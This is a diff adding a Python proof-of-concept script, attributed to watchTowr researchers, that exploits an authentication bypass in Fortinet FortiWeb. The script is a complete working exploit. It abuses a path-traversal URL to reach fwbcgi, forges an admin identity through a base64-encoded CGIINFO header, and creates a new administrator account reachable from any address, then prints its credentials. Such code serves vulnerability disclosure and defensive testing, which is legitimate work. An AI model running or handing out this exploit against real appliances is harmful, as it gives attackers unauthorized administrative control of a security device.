@@ -1,0 +1,99 @@
+import http.client
+import ssl
+import base64
+import json
+from uuid import uuid4
+import sys
+
+banner = """			 __         ___  ___________                   
+	 __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________ 
+	 \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
+	  \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
+	   \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|   
+				  \\/          \\/     \\/                            
+
+        watchTowr-vs-Fortiweb-AuthBypass.py
+
+        (*) FortiWeb Authentication Bypass Artifact Generator
+
+          - Sina Kheirkhah (@SinSinology) and Jake Knott (@inkmoro) of watchTowr (@watchTowrcyber)
+
+        CVEs: [CVE-2025-xxxxx]
+"""
+print(banner)
+
+if len(sys.argv) != 2:
+    print("Usage: python3 watchTowr-vs-Fortiweb-AuthBypass.py <target_fortiweb_ip>")
+    sys.exit(1)
+
+user = str(uuid4())[:8]
+passwd = user
+
+host = sys.argv[1]
+raw_path = "/api/v2.0/cmdb/system/admin%3f/../../../../../cgi-bin/fwbcgi"
+
+cgiinfo_json = {
+    "username": "admin",
+    "profname": "prof_admin",
+    "vdom": "root",
+    "loginname": "admin"
+}
+
+cgiinfo_b64 = base64.b64encode(json.dumps(cgiinfo_json).encode()).decode()
+
+headers = {
+    "CGIINFO": cgiinfo_b64,
+    "Content-Type": "application/x-www-form-urlencoded",
+}
+
+body = {
+    "data": {
+        "q_type": 1,
+        "name": user,
+        "access-profile": "prof_admin",
+        "access-profile_val": "0",
+        "trusthostv4": "0.0.0.0/0",
+        "trusthostv6": "::/0",
+        "last-name": "",
+        "first-name": "",
+        "email-address": "",
+        "phone-number": "",
+        "mobile-number": "",
+        "hidden": 0,
+        "comments": "",
+        "sz_dashboard": -1,
+        "type": "local-user",
+        "type_val": "0",
+        "admin-usergrp_val": "0",
+        "wildcard_val": "0",
+        "accprofile-override_val": "0",
+        "sshkey": "",
+        "passwd-set-time": 0,
+        "history-password-pos": 0,
+        "history-password0": "",
+        "history-password1": "",
+        "history-password2": "",
+        "history-password3": "",
+        "history-password4": "",
+        "history-password5": "",
+        "history-password6": "",
+        "history-password7": "",
+        "history-password8": "",
+        "history-password9": "",
+        "force-password-change": "disable",
+        "force-password-change_val": "0",
+        "password": passwd
+    }
+}
+
+body_data = json.dumps(body)
+context = ssl._create_unverified_context()
+conn = http.client.HTTPSConnection(host, 443, context=context)
+conn.request("POST", raw_path, body=body_data, headers=headers)
+resp = conn.getresponse()
+
+if(resp.status == 200):
+    print("[+] Exploit sent successfully.")
+    print(f"[*] Check for the new user [ {user} ] with password [ {passwd} ]")
+else:
+    print("[-] Exploit failed. Status Code:", resp.status)
